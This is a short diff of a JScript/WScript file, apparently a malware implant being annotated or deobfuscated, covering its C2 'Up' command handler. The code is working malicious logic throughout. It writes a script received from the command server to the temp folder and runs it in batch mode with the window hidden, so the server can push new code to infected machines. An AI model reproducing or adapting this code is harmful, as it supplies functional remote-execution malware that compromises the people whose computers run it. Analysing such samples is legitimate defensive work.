@@ -71,14 +71,16 @@ do {
 	    WScript.Quit(1);
 	}
 
-	
+
+	// Allow to run a new script, with the ability to contact the C2
 	if (Response[0] === "Up") {
 	    var pathTemp = GetEnvironementVar("temp") + "\\" + Response[2]; // s2
 	    var file = FileSystem.CreateTextFile(pathTemp,true); // ctf
-	    var gu = Response[1]; // gu
-	    gu = gu.replace("|U|","|V|");
-	    file.Write(gu);
+	    var content = Response[1]; // gu
+	    content = content.replace("|U|","|V|");
+	    file.Write(content);
 	    file.Close();
+	    // Executes the new script in batch mode, hides the window and focus previous window
 	    shell.run("wscript.exe //B \"" + pathTemp + "\"",6);
 	    WScript.Quit(1);
 	}
